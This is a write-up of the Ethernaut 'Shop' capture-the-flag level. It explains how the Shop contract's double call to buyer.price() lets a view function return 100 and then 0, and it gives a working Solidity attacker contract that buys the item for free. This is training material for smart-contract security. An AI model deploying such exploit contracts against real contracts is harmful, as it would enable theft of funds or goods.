# Shop Ethernaut

## Goals

=> Get the item from the shop for less than the price asked

### Hints

- Shop expects to be used from a Buyer
- Understanding restrictions of view functions

### Solution

- So the problem of the Shop contract is the `buyer.price()` is getting called twice, to pass the first if case it needs to return a value >= 100 and the isSold variable has to be falsy. After that the isSold variable gets changed to true and then the price gets set to the `buyer.price()` here we can now return another value, the cheapest way would be just reading storage from the `isSold` state in the shop contract and then returning another value when this is true e.g. `return shop.isSold() ? 0 : 100;`

### Attacker Contract

- Just call the `attack()` function and pass in the Shops address when deploying the contract.

```solidity
contract Hack is Buyer {
    Shop public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view override returns (uint) {
        return shop.isSold() ? 0 : 100;
    }

    function attack() external {
        shop.buy();
    }
}
```
